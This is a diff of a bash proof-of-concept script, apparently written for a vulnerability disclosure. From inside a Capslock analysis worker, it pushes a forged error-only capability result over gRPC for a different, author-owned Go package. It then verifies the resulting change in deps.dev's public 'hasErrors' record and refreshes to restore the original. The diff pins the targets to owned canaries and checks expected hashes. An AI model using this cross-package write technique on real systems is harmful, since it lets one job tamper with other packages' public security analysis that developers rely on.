@@ -7,19 +7,16 @@ export LC_ALL
 usage() {
   cat <<'EOF'
 Usage:
-  ./poc-v26.sh --target PACKAGE@VERSION
-  TARGET=PACKAGE@VERSION ./poc-v26.sh
+  ./poc.sh
 
-Runs one error-only CapabilityResultAction, proves the deps.dev analysis hash
-changes, sends Talisman.Refresh, and waits for the baseline hash to return.
+From Robert's exact owned source A worker, writes one error-only
+CapabilityResultAction for Robert's exact owned target B, proves B's public
+deps.dev `hasErrors` value changes, sends Talisman.Refresh for B, and waits for
+the exact baseline hash to return.
 
 Environment overrides:
-  CURRENT           Source module@version (default: owned v0.0.25)
-  ALLOWED_PACKAGE   Permitted target package (default: Robert's owned module)
-  MARKER            Benign error marker (default: unique CROSSJOB_V026_E2E_*)
   POLL_INTERVAL     Seconds between deps.dev reads (default: 5)
   POLL_TIMEOUT      Timeout for each poll phase (default: 600)
-  RECEIPT_DIR       Evidence directory (default: mktemp under /tmp)
 EOF
 }
 
@@ -182,12 +179,16 @@ poll_public() {
       tee -a "$receipt_dir/public-poll.log"
 
     if [ "$public_status" = 200 ] && [ "$public_digest" != - ]; then
-      if [ "$poll_mode" = changed ] && [ "$public_digest" != "$poll_want" ]; then
+      if [ "$poll_mode" = changed ] && [ "$public_digest" = "$EXPECTED_ALTERED_SHA256" ] &&
+        grep -Fq '"package":"github.com/benr00t3d/go-byteman-crosswrite-canary"' "$fetch_output" &&
+        grep -Fq '"version":"v0.0.1"' "$fetch_output" &&
+        grep -Fq '"hasErrors":true' "$fetch_output"; then
         cp "$receipt_dir/public-current.json" "$receipt_dir/public-altered.json"
         ALTERED_HASH=$public_digest
         return 0
       fi
-      if [ "$poll_mode" = restore ] && [ "$public_digest" = "$poll_want" ]; then
+      if [ "$poll_mode" = restore ] && [ "$public_digest" = "$poll_want" ] &&
+        grep -Fq '"hasErrors":false' "$fetch_output"; then
         cp "$receipt_dir/public-current.json" "$receipt_dir/public-restored.json"
         restored=1
         return 0
@@ -202,12 +203,23 @@ poll_public() {
 
 send_refresh() {
   build_refresh "$receipt_dir/refresh.bin"
+  refresh_request_hash=$(sha256sum "$receipt_dir/refresh.bin" | awk '{print $1}')
+  [ "$refresh_request_hash" = "$EXPECTED_REFRESH_SHA256" ] || {
+    printf 'Refusing: Refresh frame hash mismatch: %s\n' "$refresh_request_hash" >&2
+    return 1
+  }
   printf 'REFRESH_TARGET=%s\n' "$TARGET"
+  printf 'REFRESH_REQUEST_SHA256=%s\n' "$refresh_request_hash"
   if ! grpc_call 'sos.talisman.Talisman/Refresh' "$receipt_dir/refresh.bin" refresh; then
     printf '%s\n' 'REFRESH_GRPC_OK=0 (curl failed)' >&2
     return 1
   fi
-  sed -n '1,20p' "$receipt_dir/refresh.headers"
+  refresh_body_bytes=$(file_size "$receipt_dir/refresh.body")
+  [ "$refresh_body_bytes" -le 4096 ] || {
+    printf 'REFRESH_GRPC_OK=0 (oversize body: %s)\n' "$refresh_body_bytes" >&2
+    return 1
+  }
+  printf 'REFRESH_BODY_BYTES=%s\n' "$refresh_body_bytes"
   printf 'REFRESH_BODY_SHA256='
   sha256sum "$receipt_dir/refresh.body" | awk '{print $1}'
   if ! grpc_ok "$receipt_dir/refresh.headers"; then
@@ -248,68 +260,18 @@ on_exit() {
 }
 
 main() {
-  TARGET=${TARGET:-}
-  while [ "$#" -gt 0 ]; do
-    case "$1" in
-      -t|--target)
-        [ "$#" -ge 2 ] || { usage >&2; exit 2; }
-        TARGET=$2
-        shift 2
-        ;;
-      --target=*)
-        TARGET=${1#*=}
-        shift
-        ;;
-      -h|--help)
-        usage
-        exit 0
-        ;;
-      *)
-        printf 'Unknown argument: %s\n' "$1" >&2
-        usage >&2
-        exit 2
-        ;;
-    esac
-  done
-
-  [ -n "$TARGET" ] || { usage >&2; exit 2; }
-  case "$TARGET" in
-    ?*@?*) ;;
-    *) printf '%s\n' 'Refusing: target must be PACKAGE@VERSION.' >&2; exit 2 ;;
-  esac
-  if printf %s "$TARGET" | grep -q '[^A-Za-z0-9._~/@+-]'; then
-    printf '%s\n' 'Refusing: target contains unsupported characters.' >&2
-    exit 2
-  fi
-
+  [ "$#" -eq 0 ] || { usage >&2; exit 2; }
+  CURRENT='github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.62-codex'
+  TARGET='github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.1'
   PACKAGE=${TARGET%@*}
   VERSION=${TARGET##*@}
-  case "$PACKAGE" in
-    *@*) printf '%s\n' 'Refusing: target contains more than one @.' >&2; exit 2 ;;
-  esac
-  case "$VERSION" in
-    */*) printf '%s\n' 'Refusing: version must not contain /.' >&2; exit 2 ;;
-  esac
-
-  ALLOWED_PACKAGE=${ALLOWED_PACKAGE:-github.com/benr00t3d/go-cgo-pkgsite-probe}
-  [ "$PACKAGE" = "$ALLOWED_PACKAGE" ] || {
-    printf 'Refusing: target package must be %s.\n' "$ALLOWED_PACKAGE" >&2
-    exit 2
-  }
-
-  CURRENT=${CURRENT:-github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.25}
-  case "$CURRENT" in
-    "$ALLOWED_PACKAGE"@?*) ;;
-    *) printf '%s\n' 'Refusing: CURRENT is outside ALLOWED_PACKAGE.' >&2; exit 2 ;;
-  esac
   QUEUE='capslock-capability-result'
-  SOURCE='robert-owned-v026-crossjob'
-  MARKER=${MARKER:-CROSSJOB_V026_E2E_$(date -u +%Y%m%dT%H%M%SZ)}
-  if printf %s "$MARKER" | grep -q '[^ -~]'; then
-    printf '%s\n' 'Refusing: MARKER must contain printable ASCII only.' >&2
-    exit 2
-  fi
-  [ -n "$MARKER" ] || { printf '%s\n' 'Refusing: empty MARKER.' >&2; exit 2; }
+  SOURCE='robert-owned-v062-a-to-b-public-canary'
+  MARKER='CROSSPKG_V062_B_ZIP_SHA256_e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684_PUBLIC_RESULT_CANARY'
+  EXPECTED_PUSH_SHA256='b846a01ea50cf758630fd4c9597937f81b8bf91fb46a8058a181af48bf965d2b'
+  EXPECTED_REFRESH_SHA256='5f5604aff7ef29643b7768e58b3dfdc510e58adcd37e596ac0892b72c733290a'
+  EXPECTED_BASELINE_SHA256='bb0f29abd8210aa614a6175e38265532487079bebd25ab94ca21eaaeb13c157c'
+  EXPECTED_ALTERED_SHA256='5ec2c29ccadbf5bee106dbc53146bb8c2ec5edd37f573720c4bfabe5ca01efa4'
 
   POLL_INTERVAL=${POLL_INTERVAL:-5}
   POLL_TIMEOUT=${POLL_TIMEOUT:-600}
@@ -325,7 +287,7 @@ main() {
   pid1_cmdline=$(tr '\000' ' ' </proc/1/cmdline)
   case "$pid1_cmdline" in
     *talisman-worker-capabilities*) ;;
-    *) printf 'Refusing: unexpected PID 1: %s\n' "$pid1_cmdline" >&2; exit 2 ;;
+    *) printf '%s\n' 'Refusing: unexpected PID 1.' >&2; exit 2 ;;
   esac
   case "$(pwd -P)" in
     */capslock/modcache/"$CURRENT") ;;
@@ -345,12 +307,7 @@ main() {
   version_url=$(printf %s "$VERSION" | sed -e 's/+/%2B/g')
   DEPSDEV_URL="https://deps.dev/_/s/go/p/$package_url/v/$version_url/analysis"
 
-  if [ -n "${RECEIPT_DIR:-}" ]; then
-    mkdir -p "$RECEIPT_DIR"
-    receipt_dir=$RECEIPT_DIR
-  else
-    receipt_dir=$(mktemp -d /tmp/go-fun-v026.XXXXXX)
-  fi
+  receipt_dir=$(mktemp -d /tmp/go-crosspkg-v062.XXXXXX)
   push_may_have_landed=0
   restored=0
   baseline_hash=
@@ -363,36 +320,55 @@ main() {
     "$CURRENT" "$TARGET" "$MARKER" "$DEPSDEV_URL"
 
   fetch_public "$receipt_dir/public-baseline.json"
-  [ "$public_status" = 200 ] && [ "$public_digest" != - ] || {
+  [ "$public_status" = 200 ] && [ "$public_digest" = "$EXPECTED_BASELINE_SHA256" ] || {
     printf 'Refusing: deps.dev baseline status=%s sha256=%s\n' \
       "$public_status" "$public_digest" >&2
     exit 1
   }
+  grep -Fq '"package":"github.com/benr00t3d/go-byteman-crosswrite-canary"' "$receipt_dir/public-baseline.json" &&
+    grep -Fq '"version":"v0.0.1"' "$receipt_dir/public-baseline.json" &&
+    grep -Fq '"hasErrors":false' "$receipt_dir/public-baseline.json" || {
+      printf '%s\n' 'Refusing: target B baseline is not the exact expected clean record.' >&2
+      exit 1
+    }
   baseline_hash=$public_digest
   printf 'BASELINE_SHA256=%s\n' "$baseline_hash"
 
   # Exactly one error-only action; dynamic protobuf and gRPC lengths throughout.
   build_push "$receipt_dir/push.bin"
+  push_request_hash=$(sha256sum "$receipt_dir/push.bin" | awk '{print $1}')
+  [ "$push_request_hash" = "$EXPECTED_PUSH_SHA256" ] || {
+    printf 'Refusing: Push frame hash mismatch: %s\n' "$push_request_hash" >&2
+    exit 1
+  }
+  printf 'PUSH_REQUEST_SHA256=%s\n' "$push_request_hash"
   push_may_have_landed=1
   if ! grpc_call 'sos.queue.Queue/Push' "$receipt_dir/push.bin" push; then
     printf '%s\n' 'Push curl failed; attempting restoration.' >&2
     exit 1
   fi
 
-  sed -n '1,20p' "$receipt_dir/push.headers"
-  printf 'PUSH_BODY_BYTES=%s\n' "$(file_size "$receipt_dir/push.body")"
+  push_body_bytes=$(file_size "$receipt_dir/push.body")
+  [ "$push_body_bytes" -le 16384 ] || {
+    printf 'PUSH_GRPC_OK=0 (oversize body: %s)\n' "$push_body_bytes" >&2
+    exit 1
+  }
+  printf 'PUSH_BODY_BYTES=%s\n' "$push_body_bytes"
   printf 'PUSH_BODY_SHA256='
   sha256sum "$receipt_dir/push.body" | awk '{print $1}'
-  od -An -tx1 -v "$receipt_dir/push.body"
   grpc_ok "$receipt_dir/push.headers" || {
     printf '%s\n' 'PUSH_GRPC_OK=0' >&2
     exit 1
   }
   printf 'PUSH_GRPC_OK=1\n'
 
-  action_id=$(grep -aEo '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
-    "$receipt_dir/push.body" | head -n 1)
-  [ -n "$action_id" ] || { printf '%s\n' 'No server action ID returned.' >&2; exit 1; }
+  action_ids=$(grep -aEo '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
+    "$receipt_dir/push.body" || true)
+  [ "$(printf '%s\n' "$action_ids" | grep -c .)" -eq 1 ] || {
+    printf '%s\n' 'Expected exactly one server action ID.' >&2
+    exit 1
+  }
+  action_id=$action_ids
   grep -aFq "$TARGET" "$receipt_dir/push.body" &&
     grep -aFq "$MARKER" "$receipt_dir/push.body" || {
       printf '%s\n' 'PUSH_ECHOES_TARGET_AND_MARKER=0' >&2
